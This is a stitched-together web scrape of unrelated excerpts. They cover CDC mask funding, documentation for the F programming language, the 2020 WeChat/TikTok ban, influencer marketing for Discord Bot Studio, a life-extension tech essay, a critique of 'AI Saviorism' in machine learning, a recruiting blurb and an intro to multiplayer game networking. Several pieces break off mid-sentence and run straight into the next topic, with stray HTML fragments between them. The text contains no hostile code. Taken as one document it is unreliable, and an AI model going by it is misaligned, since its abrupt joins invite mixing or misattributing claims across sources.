<p><span>When you consider all of the budgetary cuts that were proposed for the CDC, which have </span><a href="https://www.politifact.com/factchecks/2020/feb/28/michael-bloomberg/did-donald-trump-fire-pandemic-officials-defund-cd/"><span>emerged in the wake</span></a><span> of the pandemic, and which generally involved only tens of millions of dollars, it seems unlikely that even $25 million would be allocated just for masks, but why is that? With a federal budget of $3.8 trillion why are we so concerned about $25 million? (It’s the equivalent of worrying about $25 when you make $3.8 million a year.) I understand people who are opposed to government spending, </span><a href="https://wearenotsaved.com/2017/10/21/the-nation-debt-in-three-lists-of-six-items/"><span>heck I’m one of them</span></a><span>, but this also seems like one of those classic cases where people balk at spending anything to prevent a crisis, while somehow simultaneously being willing to bury the problem in a </span><em><span>giant mountain of money</span></em><span> once the crisis actually hits. It would be one thing if we refused to spend the money regardless of the circumstances, but if recent financial news is any indication we’re obviously willing to spend whatever it takes, just not in any precautionary way. …</span></p></div></div>

<p><a href="http://www.nsl.com/k/f/f.k">F</a> is a pure functional concatenative 
language originally designed as an extension of <a href="http://www.nsl.com/papers/false.htm">False</a>. F contains the list-operations of <a href="http://www.kx.com/">K3</a> and the <em>dip</em> combinator 
of <a href="http://www.latrobe.edu.au/philosophy/phimvt/joy.html">Joy</a>. Floating-point and symbolic datatypes are supported. One-time assignment
is enforced in syntax. A theory of function-valence and -charge is outlined. F also contains a general continuation
primitive $, and the pattern sublanguage of <a href="http://www.nsl.com/k/xy/xy.htm">XY</a>.  <a href="http://www.nsl.com/k/f/g.k">G</a> is a variant of F in which the K3 adverbs are implemented as primitives.</p>

<h2>0. Introduction</h2>

<p>F has the following properties:</p>

<blockquote>
    <ul>
        <li>The language is concatenative</li>
        <li>The language is purely functional</li>
        <li>All K verbs are implemented</li>
        <li>All primitives are denoted by single symbols</li>
        <li>Primitive symbols are as mnemonic as possible</li>
    </ul>
</blockquote>

<p><em>The language is concatenative.</em> F tokens are words,
words denote functions, and the concatenation of words denotes
the composition of functions. In classical concatenative
languages, everything is a function from stacks to stacks. In F,
everything is a function from triples of
(environment;stack;queue) to triples of
(environment;stack;queue).</p>

<p><em>The language is purely functional.</em> There are no
side-effects. F has assignment, but not reassignment. This means
that you can't use a variable to store dynamic state. F
assignment associates names with values in an environment which
is passed as an argument and returned as a value. F also has
commands for interacting with the run-time environment and the
file-system, but these operations are notationally differentiated
from the operators of F: "h", "r", &amp;c.
They are intended as debugging aids only.</p>

<p><em>All K verbs are implemented.</em> Some K verbs are
implemented as primitives, and some are derived in the F prelude.
For example, the <em>atom</em> primitive @ of K is defined as
[#ints~]; i.e. shape matches the empty integer vector. Where K
provides a pair of functions, one of which is easily defined in
terms of the other, F implements one as a primitive and derives the
other. For example, <em>and</em> is primitive (&amp;) and <em>or</em>
is derived.  The criterion for dividing related pairs is simply
this:  the derived definition must not be egregiously inefficient
when compared to the primitive it supplants.</p>

<p><em>All primitives are denoted by single symbols.</em>
Although list-notation ([x y z]) is supported, any list can be
constructed functionally with ' (<em>quote</em>) and , (<em>join</em>).</p>

<p><em>Primitive symbols are as mnemonic as possible.</em> There
are five ways the mapping of a function to a symbol can be
mnemonic:</p>

<blockquote>
    <ol>
        <li>The symbol is in common use for the mapped function
            (e.g. + for addition)</li>
        <li>The symbol is mapped to that function in K (e.g. ?
            for <em>find</em>) or False (e.g. ! for <em>unquote</em>)</li>
        <li>The name of the symbol is a homonym for the mapped
            function (e.g. ' for <em>quote</em>)</li>
        <li>A pair of related functions (inverses, or
            near-inverses) are mapped to a pair of related
            symbols (e.g. / and \ for <em>take</em> and <em>drop</em>)</li>
        <li>Where several K primitives are mapped to one symbol,
            the primitives should form an easily remembered group
            based on some common property; e.g. both <em>upgrade</em>
            and <em>enum</em> return indices based on an
            ascending relation, so both are mapped to &lt;. </li>
    </ol>
</blockquote>

<h2>1. Datatypes</h2>

<p>The initial state of the interpreter consists of an
environment containing the F words of the prelude, an empty
result stack, and a string (character-vector) to be evaluated.
The input string is tokenized and parsed to obtain the initial
queue. </p>

<p>The input queue is a K list, possibly containing integers,
floats, symbols, <em>null</em>, functions, and lists
("quotations"). The result stack is initially empty.
The environment is a K dictionary. F processes the environment,
stack, and queue repeatedly until the queue is empty. </p>

<p>If the first item on the queue is an integer, float, <em>null</em>,
the prototype symbol `, or a list, the item is pushed onto the
stack.</p>

<p>If the first item is an undefined symbol, then if it's a <em>shuffle</em>
it's applied; otherwise, a variable is created (in the environment)
having the top of the stack as the value. </p>

<p>If the first item is a defined symbol, its value is
retrieved (from the environment) and pushed onto the stack.</p>

<p>If the first item is a function, then it is applied to the
environment, stack, and queue to produce a new environment,
stack, and queue.</p>

<p>Observe that the domain of the result stack is a proper subset
of the domain of the input queue. On the queue we may find
character-atoms, such as "r", and strings, such as
"blah". But character-atoms are executed away when they
are evaluated, and no F primitive ever produces one, and strings
are comments, which are not processed.</p>

<p>The <em>trace</em> command displays the stack and queue for
selected objects in the trace list T:</p>

<blockquote>
    <pre>F&gt;[fac] "t"

F&gt;3 fac!
                                       3 ♦ fac !
                                     3 2 ♦ fac ! *
                                   3 2 1 ♦ fac ! * *

F&gt;

F&gt;[fac cond] "t"

F&gt;3 fac!
                                       3 ♦ fac !
       3 [1 =] [] [dup ! pred ! fac ! *] ♦ cond !
                                     3 2 ♦ fac ! *

                                   3 2 1 ♦ fac ! * *

<h3>System Functions (K)</h3>

<p>The K system functions have reserved names:</p>

<blockquote>
    <pre>type (4::)
log exp abs sqr sqrt floor dot mul inv lsq
sin cos tan asin acos atan sinh cosh tanh
draw
in lin bin binl dv dvl di vs sv</pre>
</blockquote>

<h3>Literals (L)</h3>

<p>F has nine reserved names for literals:</p>

<blockquote>
    <pre>Nan		minint (0N)
Inf		maxint (0I)

nan		NaN (0n)
inf		infinity (0i)

null		null (_n)
sym		prototype sym (`)

ints		empty integer vector (!0)
floats		empty float vector (0#0.)
syms		empty sym vector (0#`)</pre>
</blockquote>

<h3>Commands (I)</h3>

<p>F has the following interactive commands:</p>

<blockquote>
    <pre>".."		comment		1 "skip" 2	comment not processed

"b"		break		'x "b"		signal error ('x)
"c"		clear		1 2 "c" 3 4	clear, load f, prelude
"d"		defined		'foo "d"	is foo defined?
"e"		error		0 "e"		set/unset error trap (\e)
"f"		F		"f" 2 unit!	set F semantics, clear
"j"		Joy		"j" 2 unit	set Joy semantics, clear
"k"		K		1 2 "k" 3 4	exit to K
"l"		load		'x "l"		load f/x.f|x.j
"m"		measure		[10&lt;] "m"	measure time in ms
"o"		words		'map "o"	show word form
"p"		precision	3 "p"		print precision (\p)
"r"		read		1 2 "r" 3 4	read, parse, eval
"s"		store		y 'x "s"	store f/x.f|x.j
"t"		trace		null "t" 3 4	set trace-list (T)

"x"		exit		1 2 "x" 3 4	_exit 0
"w"		write		1 2 "w" 3 4	format, write
"z"		halt		1 2 "z" 3 4	: to continue
</pre></blockquote>

<h3>Names and numbers</h3>

<p>Spaces (<em>blank</em>, <em>tab</em>, <em>return</em>) are
necessary to separate names from names and numbers from numbers,
but not names from numbers.</p>

<p>A name must begin with a letter and may contain letters, .,
or a single -.  A name containing a - is a shuffle-symbol.</p>

<p>A numerical expression must begin with either a digit or - 
followed by a digit, and must end with a digit.  A floating-point 
numerical expression must contain exactly one . which
must be flanked by digits.</p>

<h3>Operators</h3>

<p>The math, logic, and relational operators are <em>atomic
functions</em>. For example,</p>

<blockquote>
    <pre>F&gt;[1 2 3][[4 5 6] 7 8]+
[[5 6 7] 9 11]</pre>
</blockquote>

<p>In several instances, distinct K operations have been mapped
to one symbol: </p>

<blockquote>
    <pre>int &lt;			enum			!x
~atom &lt;			upgrade			&lt;x
atom &lt;			nonce

int/ints @		where			&amp;x
list @			flip			+x
			nonce

atom y ?		mod			y!x
~atom y ?		find			x?y

list atom \		rotate			y!x
atom list \		drop			x _ y
atom atom \		drop			x _(),y
list list \		cut			x _ y

1=#x .			infra
x .			index/monad/dyad	. x</pre>
</blockquote>

<h3>Iterators</h3>

<p>The False combinators <em>if</em> and <em>while</em> have been
eliminated, and <em>cond</em>, <em>if</em>, and <em>while</em>
have been defined as words in the prelude. The truth-values of F
are more general than those of K: 0 is <em>false</em>, any other
value is <em>true</em>.</p>

<h3>Assignment</h3>

<p>Assignment has the form <em>value unassigned_name</em>. An
assigned name may not be re-assigned.</p>

<p>Reserved names cannot be assigned:</p>

<blockquote>
    <pre>F&gt;12 inf
12 inf</pre>
</blockquote>

<p>Use of an assigned name (a variable) places the value assigned
to it on the stack:</p>

<blockquote>
    <pre>F&gt;10 a

F&gt;a
10
F&gt;12 a
10 12 10
F&gt;a
10 12 10 10</pre>
</blockquote>

<p>A symbol can be produced indirectly:</p>

<blockquote>
    <pre>F&gt;10 foo

F&gt;foo
10
F&gt;[foo] first!
foo
F&gt;!
10</pre>
</blockquote>

<h3>Quotation</h3>

<p>The <em>quote</em> primitive ' takes the next item on the
queue and quotes it:</p>

<blockquote>
    <pre>F&gt;'+
[+]
F&gt;
F&gt;'[1 2 3]
[[1 2 3]]
F&gt;
F&gt;''
[']</pre>
</blockquote>

<p>The <em>unquote</em> combinator ! is Joy's <em>i</em>. ! takes
the top item <em>x</em> on the stack and prepends the elements of
<em>x</em> to the queue:</p>

<blockquote>
    <pre>F&gt;2 3 '+ !
5</pre>
</blockquote>

<p>The <em>dip</em> combinator is defined as it is in Joy. `
takes the top two items <em>x</em> <em>y</em> on the stack and</p></div>

<p>According to the <a href="https://twitter.com/AndrewFeinberg/status/1291545381453602821">decree</a>, from September 20, transactions between American companies and the owners of WeChat and TikTok will be prohibited. The first service, which is a messenger, is owned by Tencent.</p>




<p>In a statement to the LA Times, the White House administration <a href="https://www.latimes.com/politics/story/2020-08-06/trump-signs-executive-order-to-ban-tiktok">clarified</a> that in the case of Tencent, the ban only applies to transactions that are related to WeChat. That is, the decree should not affect companies like Riot Games — it is based in the United States, but it is fully owned by Tencent.</p>



<p>Tencent also owns stakes in Grinding Gear Games (Path of Exile), Yager (Spec Ops: The Line), Funcom (Conan Exiles) and Epic Games (Epic Games Store). In addition to gaming companies, Tencent has a share, for example, in Reddit and Spotify.</p>



<p>As <a href="https://twitter.com/nwadhams/status/1291580648952680465">noted</a> by Bloomberg, Apple and Google are at risk, since prohibited transactions may include placing apps in digital stores or, for example, buying ads in TikTok.</p>



<p>After the news of the decree, Tencent shares <a href="https://www.bloomberg.com/news/articles/2020-08-07/chinese-hong-kong-stocks-drop-after-trump-moves-to-ban-tencent">fell</a> by 10%, which caused the company’s market value to fall by $ 30 billion. This happened before the white house clarified the details of the ban.</p>



<ul><li><figure><img src="https://nintendosmash.com/wp-content/uploads/2020/08/tencen-share.jpg" alt="" data-id="4779" data-link="https://nintendosmash.com/?attachment_id=4779" srcset="https://nintendosmash.com/wp-content/uploads/2020/08/tencen-share.jpg 681w, https://nintendosmash.com/wp-content/uploads/2020/08/tencen-share-300x155.jpg 300w" sizes="(max-width: 681px) 100vw, 681px"></figure></li></ul>



<p>WeChat is the main messenger in China, which has an integrated payment system. Purchases are made through it, for example, in the local version of eShop on Switch, as well as an authorization on the Nintendo console in principle.</p>



<p>According to the decree, the app itself will not be blocked in the United States, but some local users are already <a href="https://twitter.com/xuhulk/status/1291561967451279362">concerned</a> since WeChat is the only messenger that can be used without a VPN to contact people in China.</p>



<p>Donald Trump announced his intention to block TikTok in the United States in early August, but Microsoft wants to prevent this. The company is in talks with the owner of the bytedance app and intends to buy out its business in the US and some other countries to avoid the ban.</p>



<p>ByteDance and Microsoft must conclude a deal by September 15, while the latter will also have to pay a certain amount to the US Treasury.</p>



<p>As for WeChat, Tencent will probably try to appeal the decision, but so far there has been no response from the conglomerate.</p>

        <div itemprop="articleBody">
    

    <p>For the last few months, I’ve been reaching out to “micro influencers” on YouTube, with the hope of driving targeted traffic to my product, <a href="http://discordbotstudio.org/">http://discordbotstudio.org</a>. I’m classifying micro influencers as having between 1,000 – 10,000 subscribers on YouTube. The benefit of reaching channels of this size is that they have dedicated audiences based on a certain niche (in my case this is Discord Bots and the creation thereof).</p>

<p>Discord Bot Studio (DBS) is a visual programming tool I released on Steam on May 12th, 2020 (2 months prior to writing this). It’s a utility that lets users create Discord bots without needing to write any code, a task that usually requires programming knowledge. Up to this point I have sold about 1,000 copies of DBS, all through Steam. My only marketing efforts to this point have been SEO, through the landing page I’ve had setup for almost a year, and through Steam itself, where DBS is sold. I also grew a decently sized mailing list from the landing page, but I saw very poor conversion from that list. I’m content with the traffic I’m getting through SEO alone, but I recognize that I need to explore other marketing channels to continue to grow.</p>

<p>The basic strategy I followed was searching YouTube for channels that pertained to Discord bots, and the creation of Discord bots. I preferred channels that had some upload regularity, and consistent view counts. I would send these channels an email if I could find their address, and offer them a free copy of Discord Bot Studio in exchange for them hopefully creating a video about it. Most of the responses I got were positive, and many were open to at least trying out the product.</p>

<ul>
<li>📫 <strong>Emails Sent</strong>: ~55</li>
<li>💌 <strong>Response Rate</strong>: ~60%</li>
<li>🎥 <strong>Videos Created</strong>: 4 at the time of writing this</li>
<li>📈 <strong>Video Views</strong>: ~4,000</li>
<li>💰 <strong>My Costs Incurred</strong>: $0.00</li>
<li>💵 <strong>Sales Generated</strong>: Unknown. DBS is sold on Steam. Unfortunately Steam analytics and conversion tracking is super limited. They say this is because most purchases are made in the Steam desktop client, even if traffic originally arrives at the web page for the product. Anecdotally, I have spoken to a few customers who’ve told me they found DBS through the videos.</li>
</ul>

<p>It’s hard to tell at this point whether my efforts have, and will pay off. My hope is that these videos provide nearly evergreen marketing, since they will forever be on YouTube accruing views. I am happy with the amount of sales I’m currently making through organic traffic coming from Google and Steam. That being said, the traffic from those channels has leveled off, and I’m open to experimenting with new strategies to look for more growth opportunity. I think I will stop reaching out to YouTube influencers for the time being, and focus my marketing efforts elsewhere to find a strategy that sticks.</p>

<p>Being a low cost, one-time purchase product, it’s hard to imagine a scenario where any sort of paid advertising is going to work for DBS. With that in mind, I will continue to experiment with free, and low cost marketing channels which I haven’t tried yet. I believe the biggest potential opportunity is content marketing. Creating content obviously takes a lot of time, but it’s generally free, and therefore low risk for my young business.</p>

                        <p>If the proximate purpose of technology is to reduce scarcity, the ultimate purpose of technology is to eliminate mortality.</p><p>At first that sounds crazy. But let's start with the premise: is the proximate purpose of technology to reduce scarcity? Think about how a breakthrough is described: faster, smaller, cheaper, better. All of these words mean that with this new technology, one can do <em>more with less</em>. In the digital world, Google made information on any topic free to anyone with an Internet connection, and WhatsApp made it free to communicate with the same. In the physical world, innovations like the <a href="https://en.wikipedia.org/wiki/Haber_process">Haber Process</a> or the <a href="https://en.wikipedia.org/wiki/Norman_Borlaug#Expansion_to_South_Asia:_the_Green_Revolution">Green Revolution</a> allowed us to produce more with less. In a real sense, these technologies <em>reduced scarcity</em>.</p><p>Now for second half of the sentence, the logical implication. Is the ultimate purpose of technology to eliminate mortality? Well, mortality is the main source of scarcity. If we had infinite time, we would be less concerned with whether something was faster. The reason speed has value is because time has value; the reason time has value is because human life has value, and lifespans are finite. If you made lifespans much longer, you'd reduce the effective cost of <em>everything</em>. Thus insofar as reducing scarcity is acknowledged to be the proximate purpose of technology, eliminating the main source of scarcity – namely mortality – is the ultimate purpose of technology. <strong>Life extension is the most important thing we can invent.</strong></p><p>And it's actually feasible today. It's been shown that we can extend healthy lifespans in mammals – and even <em>reverse</em> aging to bring people back to youth.

</figure><p>You probably weren't aware of this, though. You probably also weren't aware of how far we've come on <a href="https://www.nature.com/articles/d41586-020-00339-3">gene therapy</a>, how much has been done in <a href="https://www.the-scientist.com/news-opinion/rna-injection-restores-hearing-in-guinea-pigs-30855">regenerative medicine</a>, how advanced the latest <a href="https://www.nature.com/articles/s41586-020-2285-x">bionic eyes</a> are – or how <a href="https://twitter.com/balajis/status/1228447944287932416">deadly</a> COVID-19 was as a threat until March of 2020.</p><h2 id="a-duty-to-evangelize-technological-progress">A duty to evangelize technological progress</h2><p>That is because people with scientific and technical backgrounds have not taken it upon ourselves to write about technological progress <em>as a duty</em>. We need to take time out of our busy days to make the case, repeatedly and with high production values, that technological progress is the <em>most </em>important thing we can do for broad-based prosperity and economic growth, and for life itself.</p><p>That starts with testing, drugs, treatments, and vaccines for COVID-19. But it goes far beyond that. Put another way: we may not get life extension or the whole suite of transhumanist technologies (brain-machine interfaces, stem cells, CRISPR gene therapy, and more) unless you, personally, evangelize them online. Not just tweets, but articles. Not just articles, but videos. Not just videos, but feature films. And not just a few films, but an <a href="https://www.whats-on-netflix.com/news/how-long-would-it-take-to-watch-all-of-netflix/">entire Netflix original library's worth</a>, a parallel tech media ecosystem full of inspirational content for technological progressives. A lifetime's worth of content that makes the case for immutable money, infinite frontier, artificial intelligence, and eternal life.</p><p>This may mean less focus on the businesses and personalities of technology. After all, do we care whether the technology for reversing aging is developed by a startup, an academic lab, a scientific consortium, or a solitary biohacker in their garage? No. What we care about is the goal of transcendence. If the technology ends up being <a href="https://www.amazon.com/Patenting-Sun-Polio-Salk-Vacine/dp/0688094945">completely free</a> and open source, so much the better. A corporate vehicle is just one means to an end, not an end in itself. We may need to understand every detail of operating a business, but we can't get lost in those details.</p><p>The point of doing a startup after all is to build something you can't buy. Money can't yet buy you a trip to <a href="https://www.spacex.com/human-spaceflight/mars/">Mars</a>. Or a <a href="https://www.neuralink.com/">neural implant</a>. Or a <a href="https://tricorder.xprize.org/prizes/tricorder">medical tricorder</a>. And at one point in the not-too-distant past it could not buy you a web browser, a search engine, or a smartphone. When the iPhone did not exist, people had to invent it. And they needed to be inspired to invent it.</p><figure><blockquote data-width="550"><div lang="en" dir="ltr"><p>for iphone 1:</p><p>the original mac,<br>blade runner,<br>2001: a space odyssey,<br>sony walkman TPS-L2, <br>braun ET66, <br>the concorde, <br>massimo vignale, <br>henry dreyfuss, <br>apollo 11, <br>the beatles,<br>warp records,<br>NASA,<br>polaroid,<br>arthur c. clarke,<br>eero saarinen</p><p>among others… <a href="https://t.co/F3ayC03T3y">https://t.co/F3ayC03T3y</a></p></div>— Imran Chaudhri (@imranchaudhri) <a href="https://twitter.com/imranchaudhri/status/1092194839540584449?ref_src=twsrc%5Etfw">February 3, 2019</a></blockquote>

</figure><h2 id="a-sense-of-purpose">A sense of purpose</h2><p>Why doesn't inspirational content for technological progressives exist in abundance? Part of the reason is adverse selection. While science fiction – even dystopian science fiction – can inspire, the scientists, engineers, founders, and funders thus inspired are often more occupied with building technology than evangelizing it. But this in turn means that we aren't directly educating the next generation, or the public at large.</p><p>We need to change that. Specifically, people who know math and science, who have experience in managing and investing, who are <em>technological progressives</em> rather than technological conservatives – these people need to learn to write, report, publish, and direct. We need to consciously build a parallel tech-driven decentralized media ecosystem, and we need it to become the first point of call for anyone seeking to learn about technology.</p><p>In this we will have allies around the world. Only the very richest people can afford to be cynical about the merits of technological progress. The <a href="https://www.ben-evans.com/benedictevans/2019/5/28/the-end-of-mobile">billions</a> of people who just got their first smartphone have had their lives dramatically improved as a consequence, and are too pragmatic to romanticize the past. If you haven't already internalized this point, take two minutes to watch <a href="https://www.youtube.com/watch?v=QpvEWVVnICE">this</a>.</p><figure><iframe width="612" height="344" src="https://www.youtube.com/embed/QpvEWVVnICE?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><p>Back? OK. So, building a media ecosystem for technological progressives clearly starts with technical education. At the K-12 level, we've already got plenty of learning apps, and the next step is remote schools. And at the level of collegiate education and continuous learning, Lambda School, Fast.ai, Coursera, Udacity, Udemy, Binance Academy, and the countless GitHub tutorials are an amazing start. But our duty extends beyond education to media of all kinds, particularly visual media.</p><p>The tech ecosystem has natural advantages here. We have the domain knowledge. And the experts at hand. We're already doing content marketing, podcasts, conferences, and a tweetstorm or two. We understand search engines, social networks, and distribution. And yes, we have learned to code.</p><p>What we haven't done yet is <em>full stack narrative</em>. That is, with a <a href="https://wistia.com/series/one-ten-one-hundred">few exceptions</a>, like Elon Musk, we haven't really told story arcs with technological progress at the center. We haven't taken the pitch we use to recruit engineers and externalized it for the public. We haven't infused <a href="https://twitter.com/balajis/status/1276010131990261761">emotion</a> and meaning into our public communications. We haven't made every one of our companies a media company. We haven't set out to tell our story ourselves.</p><p>We need to correct that immediately, and start evangelizing technological progress with every word and action. To recognize that the purpose of technology is to transcend our limits, and to motivate everything we're doing with a sense of that purpose. To take the winnings from our web apps and <a href="https://www.quora.com/How-did-Elon-Musk-fund-his-businesses-from-PayPal-to-SpaceX-and-Tesla">put them towards Mars</a>, to feel no hesitation towards starting small and no shame in dreaming big, to tell the world that it actually is possible to <a href="https://www.the-scientist.com/news-opinion/rna-injection-restores-hearing-in-guinea-pigs-30855">cure the deaf</a>, <a href="https://www.nature.com/articles/s41586-020-2285-x">restore sight</a>, and <a href="http://med.stanford.edu/news/all-news/2020/03/old-human-cells-rejuvenated-with-stem-cell-technology.html">end</a> <a href="https://www.youtube.com/watch?v=9nXop2lLDa4">death</a> <a href="https://www.ldeming.com/longevityfaq">itself</a>.</p>

August 21, 2020 | https://www.shreya-shankar.com/ai-saviorism/ | <a href="https://web.archive.org/web/*/https://www.shreya-shankar.com/ai-saviorism/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I’m uneasy about the <em>saviorism</em> I see becoming more common in applied machine learning. The concept of “saviorism” dates back at least as far as Rudyard Kipling’s poem <a href="https://en.wikipedia.org/wiki/The_White_Man%27s_Burden">“The White Man’s Burden.”</a> In this poem, Kipling refers to 19th century imperialist “moral obligations” of white people to encourage people of color’s economic and social progress through colonialism. Some have discussed <a href="https://www.wired.com/story/tech-needs-to-listen-to-actual-researchers/">tech saviorism</a>, a modern-day manifestation of this phenomenon within the Silicon Valley bubble, and this problem has only been exacerbated by the explosive growth of the modern artificial intelligence and machine learning ecosystem. I’ve noticed that many people in the artificial intelligence and machine learning circles act as “AI Saviors,” believing that, when equipped with copious amounts of data and basic knowledge of artificial intelligence techniques, they can quickly solve open problems in unrelated fields.</p>
<p><strong>Machine learning is a tool to help build solutions, not the entire solution.</strong> Unfortunately, I hear about so many startups, ML<sup id="fnref-1"><a href="#fn-1">1</a></sup>  practitioners, VCs, and researchers that have forgotten the second part. In light of this worrying trend, I want to:</p>
<ul>
<li>Discuss examples of the AI Savior mentality and how this leads to failure. </li>
<li>Speak openly about my own mistaken use of the saviorism attitude to illustrate my points. </li>
<li>Avoid linking to specific current projects or calling out specific individuals for exhibiting AI Saviorism, since my goal is not to put people down — I want to demonstrate why machine learning practitioners must fight the AI Savior mentality in order to be effective problem-solvers. </li>
<li>Take a stab at rescoping the relationship between ML practitioners and domain experts (as an alternative to AI Saviorism) and invite people to add to or refine it.</li>
</ul>
<h2>My experience as an AI Savior</h2>
<p>In my five years at Stanford, I had plenty of access to high-profile AI thought leaders and researchers. I took several incredible machine learning courses, and there were many AI research opportunities open to me and other undergrads. These courses were incredibly popular—there were close to 1,000 students in one of my machine learning classes! </p>
<p>As I took more AI courses, I began to buy into the idea that AI methods could be quick solutions to many problems. Only upon reflection do I realize the small things in these courses probably contributed to the AI Saviorism narrative. For instance, an unfortunate consequence of having hundreds of students in these 10-week-long, project-based courses is that the projects tend to be rushed, poorly supervised, and hacked together at the last minute to boast impressive (and sometimes made-up) results for some arbitrary application of machine learning. The project fairs at the end of every class were extremely elaborate and involved lots of outside money: for example, several industry companies sponsored the project fair in my deep learning for NLP class and even <a href="https://web.stanford.edu/class/archive/cs/cs224n/cs224n.1174/reports.html">gave out prizes for the “best projects.”</a> After these classes, my peers flocked to bootcamps advertised as opportunities to use AI to solve big problems in a variety of fields within the span of one or two quarters. Could AI alone really save the world from health and climate issues in such a short time frame?</p>
<p>By the end of my undergraduate education, I (somewhat misguidedly) strongly believed that <a href="https://www.technologyreview.com/2016/01/12/163910/could-ai-solve-the-worlds-biggest-problems/">AI methods could be the solution to many problems</a>. In my deep learning for genomics class, we read Nature papers about how AI could diagnose illnesses based on x-rays, thus eliminating the need for doctors in the future<sup id="fnref-2"><a href="#fn-2">2</a></sup>. Large tech companies published blog posts describing their efforts to solve daunting medical challenges, climate questions, criminal justice issues, and more<sup id="fnref-2"><a href="#fn-2">2</a></sup>. It felt like every machine learning project went through the beginning stages of a <a href="https://en.wikipedia.org/wiki/Hype_cycle">Gartner hype cycle</a>. I’m ashamed to admit that I bought into the hype, but this issue is much larger than me and warrants greater attention, even if it’s at my expense.</p>
<h2>Losing my AI Saviorism in order to be an effective problem-solver</h2>
<p>Reality hit for me when I started working in industry. When recruiting for full-time roles, I checked all the boxes of a technically competent AI Savior — research experience, strong coding skills, an ability to “think critically” about the technology and acknowledge technical limitations, and a firm belief that non-domain experts could single-handedly revolutionize any industry with AI. The first time we ingested a client’s data, I jumped to coding up baseline models and then convolutional neural networks. Obviously, deep learning would outperform crude heuristics devised by people who couldn’t code, right? Wasn’t that what every applied ML paper boasted?</p>
<p>But my models didn’t work off the bat, and I felt disillusioned. Articles online indicated that I could blame my ML failures on <a href="https://neoteric.eu/blog/ai-projects-fail-heres-why/">data issues</a> — maybe there wasn’t enough data, or the data wasn’t clean. In communicating my ML results with the client, I kept giving excuse after excuse — the data format is inefficient, many rows have missing values, the dataset is only partially labeled, etc. — for why I, the AI Savior, couldn’t quickly deliver a solution. In hindsight, there are so many other barriers to making ML work in production, and at the time <a href="https://workera.ai/resources/machine-learning-engineer/">I thought I was only there to solve the modeling and engineering problems</a>.</p>

<em>This figure (figure 2) depicts skills needed for a machine learning engineer, taken from the <a href="https://workera.ai/resources/machine-learning-engineer/">deeplearning.ai article</a> on what a machine learning engineer does.<sup id="fnref-3"><a href="#fn-3">3</a></sup></em></p>
<p>My frustration only deepened when I realized that our product needed to be a recurring solution, not a one-time solution. I couldn’t save the client with a quick AI patch to all their problems and move on. AI Saviorism was preventing me from being an effective engineer: I needed to stop blaming my failures on lack of data or things “not in my control.” If I were really interested in machine learning to make a positive impact, I needed to figure out what my clients needed, not write more TensorFlow code. </p>
<p>As I’ve learned this past year, it’s pretty naive to assume my clients will have perfectly cleaned data, lightweight infrastructure, and a clear idea of the correct machine learning metric to evaluate. If they had all these things, I wouldn’t have a job! To be an effective problem-solver, I had to realize:</p>
<ol>
<li>For any machine learning project to be successful, you need buy-in from relevant stakeholders. You need to figure out what they want, work with them to frame those goals in ways such that success can be quantified and measured, and help them understand how the models you produce (hopefully) achieve those objectives.</li>
<li>Building machine learning models is only part of the solution, not the entire solution. There are many other technical parts of the machine learning stack: data ingestion, validation, cleaning, training, evaluation, retraining, predicting, serving, and more. You can’t just build a big black AI box and hand it to the stakeholder — you need to figure out how to connect their data to your black box, and connect your black box outputs to a part of their technology stack that they use regularly.</li>
</ol>
<p>I now firmly believe that it is on the ML practitioner to work with the stakeholder to embed their tools into the stakeholder’s stack to enable solutions, not magically promise solutions that work out-of-the-box. Over time, my AI Savior complex crumbled as I began to clean the data myself, listen to domain experts on how one would solve the problem without ML, spend (sometimes too many) hours in meetings, empathize with the clients, and humbly accept that users don’t care deeply about machine learning like I do — they just care that the product works.</p>
<h2>Other examples and implications of AI Saviorism</h2>
<p>I think it’s hard to talk about many examples of AI Saviorism without hurting egos or feelings. However, one pedagogical, seemingly non-controversial example of AI Saviorism and its failure is the <a href="https://www.wired.com/2015/10/can-learn-epic-failure-google-flu-trends/">Google Flu Trends project</a>. A group of engineers and researchers devised a way to forecast flu prevalence based on Google searches, but its forecasts at the peak of the 2013 flu season were off by 140 percent. <a href="https://gking.harvard.edu/files/gking/files/0314policyforumff.pdf">An interesting follow-up critique</a> implied that the failure was a result of correlated, but not causal variables. The authors commented on the idea of “big data hubris” — “the often implicit assumption that big data are a substitute for, rather than a supplement to, traditional data collection and analysis.” A negative consequence of “big data hubris” is quite unfortunate: with large numbers of more-detailed observations, it’s easier than ever to find semantically or structurally unrelated correlations in data. Just because someone has access to a large amount of data doesn’t mean they can exhibit AI Saviorism and blindly ignore relationships between variables found in “small data” analysis. </p>
<p>Another more recent set of examples of AI Saviorism revolves around the COVID-19 pandemic. This <a href="https://www.wired.com/story/artificial-intelligence-couldnt-save-us-from-covid-19/">WIRED article</a> discusses compelling machine learning ideas, such as a chest CT scan classifier and a viral protein generative model. But the article also implies “lack of data” is a main challenge to making these ideas work. Limited data is <em>a</em> problem, but the underlying problem here is that AI practitioners aren’t focusing on integrating their methods into existing systems designed by domain experts. Our jobs shouldn’t be to pawn off our code on someone else once we’ve gone off and written it alone, but rather to ensure our work is integrated into existing pipelines — which will inevitably involve working with the domain experts to devise better data collection techniques, and more.</p>
<p>Why bother fighting AI Saviorism for reasons other than getting a model to be used by stakeholders? If one tries to hastily build an AI system to solve an open problem in another field, they might prioritize hastily constructing a train/test split and training a bunch of models rather than the <a href="https://christophergs.com/machine%20learning/2019/03/17/how-to-deploy-machine-learning-models/">infrastructure, robust validation techniques, and deployment</a> …</p></div></div>

					<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b>&nbsp;And this is where the appeal of a recruiting company comes in.</b> They could probably reach out to 60-80% of the entire talent pool, and I would be willing to bet that they could do it in less than a week. Businesses whose main focus is not recruiting would have a very hard time matching this speed. When a company is looking at limited prospects and a lengthy process, it makes sense for them to outsource to a service that promises to deliver qualified candidates&nbsp;<i>fast</i>.

<h2 id="introduction">Introduction</h2>
<p>This is the first in a series of articles exploring the techniques and algorithms that make fast-paced multiplayer games possible. If you’re familiar with the concepts behind multiplayer games, you can safely skip to the next article – what follows is an introductory discussion.</p>
<p>Developing any kind of game is itself challenging; multiplayer games, however, add a completely new set of problems to be dealt with. Interestingly enough, the core problems are human nature and physics!</p>
<h2 id="the-problem-of-cheating">The problem of cheating</h2>
<p>It all starts with cheating.</p>
